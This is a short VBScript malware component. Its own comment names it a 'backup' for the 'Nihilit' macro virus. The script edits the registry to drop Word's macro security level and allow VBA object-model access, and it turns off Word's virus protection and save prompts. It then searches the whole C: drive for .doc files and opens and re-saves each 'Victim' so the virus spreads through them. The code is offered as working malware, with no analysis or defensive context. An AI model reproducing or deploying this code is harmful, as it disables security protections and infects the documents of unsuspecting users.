rem VBS Backup for Nihilit by Necronomikon/ZeroGravity
On Error Resume Next
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\AccessVBOM", 1, "REG_DWORD"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security\Level", 1, "REG_DWORD"
WSHShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
Set Backup = WScript.CreateObject("Word.Application")
Backup.Options.VirusProtection = False
Backup.Options.SaveNormalPrompt = False
Set Search = Backup.Application.Filesearch
Search.LookIn = "C:\": Search.SearchSubFolders = True: Search.FileName = "*.doc": Search.Execute
For f = 1 To Search.FoundFiles.Count
Victim = Search.FoundFiles(f)
Backup.Documents.Open Victim
Backup.ActiveDocument.Save
Backup.ActiveDocument.Close
Next
Backup.Application.Quit
